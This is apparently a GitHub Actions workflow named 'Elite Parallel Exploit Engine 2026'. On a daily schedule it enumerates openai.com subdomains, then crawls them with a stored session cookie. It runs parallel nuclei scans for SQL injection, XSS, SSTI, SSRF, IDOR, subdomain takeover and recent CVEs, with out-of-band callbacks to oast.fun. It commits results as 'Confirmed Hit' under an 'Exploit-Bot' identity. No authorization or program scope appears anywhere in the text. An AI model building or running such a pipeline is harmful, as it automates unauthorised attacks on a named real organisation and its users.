name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Build Target Delta
        env:
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # 1. FIX: Nuke any existing 'output' file or directory to prevent Exit Code 2
          rm -rf output
          mkdir -p output
          
          # 2. Secret Check (Will print 'Found' or 'Missing' in logs)
          if [ -z "$PDCP_API_KEY" ]; then echo "PDCP KEY MISSING"; else echo "PDCP KEY FOUND"; fi
          
          # 3. Cloud Discovery
          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt || echo "openai.com" > subs.txt
          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt || true
          cat subs.txt | sort -u | httpx -silent -t 50 -o output/alive.txt
          
          # 4. Crawling with persisted Master List
          # We try to get the existing params.txt from the repo branch
          touch output/params.txt
          katana -list output/alive.txt -jc -kf all -d 2 -H "Cookie: $COOKIE" -o output/params_new.txt || touch output/params_new.txt
          
          # 5. Delta Logic (Only scan what is actually new)
          if [ -s output/params_new.txt ]; then
            # If params.txt (master) is empty, scan everything. Otherwise, find new lines.
            if [ -s output/params.txt ]; then
              grep -vFf output/params.txt output/params_new.txt > output/to_scan.txt || touch output/to_scan.txt
            else
              cp output/params_new.txt output/to_scan.txt
            fi
          else
            touch output/to_scan.txt
          fi
          
          # Update Master List
          cat output/params.txt output/params_new.txt | sort -u > temp.txt && mv temp.txt output/params.txt

      - name: Save Recon Data
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: output/

  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets
          path: output/

      - name: Setup & Update Nuclei
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
          $HOME/go/bin/nuclei -ut

      - name: Advanced Vulnerability Scanning (2025-2026 CVEs)
        env:
          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          if [ -s output/to_scan.txt ]; then
            nuclei -l output/to_scan.txt \
              -tags ${{ matrix.vuln_type }},cve2025,cve2026,dast \
              -auth $PDCP_API_KEY \
              -interactsh-server oast.fun \
              -header "Cookie: $COOKIE" \
              -rate-limit 100 \
              -o output/hit_${{ matrix.vuln_type }}.txt
          else
            echo "No new targets found to scan."
          fi

      - name: Atomic Save Findings
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          # Detailed save logic for parallel jobs
          for i in {1..10}; do
            git pull origin main --rebase
            git add output/
            git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)" && git push origin main && break || sleep 15
          done
          
